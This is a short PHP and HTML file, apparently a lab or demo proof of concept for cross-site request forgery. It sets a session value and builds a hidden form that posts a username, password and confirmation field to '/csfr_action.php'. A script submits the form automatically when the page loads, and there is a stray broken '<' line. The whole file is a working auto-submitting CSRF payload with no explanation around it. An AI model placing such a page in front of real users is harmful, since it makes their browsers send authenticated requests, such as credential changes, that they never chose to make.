<?php
// Start the session
session_start();
$_SESSION["confirmation"] = "confirm";
?>

<form method="POST" action="/csfr_action.php">
  <input type=hidden name=username value="host">
  <input type=hidden name=password value="pass">
  <input type=hidden name=confirmation value="confirm">
  <
</form>
<script>document.forms[0].submit()</script>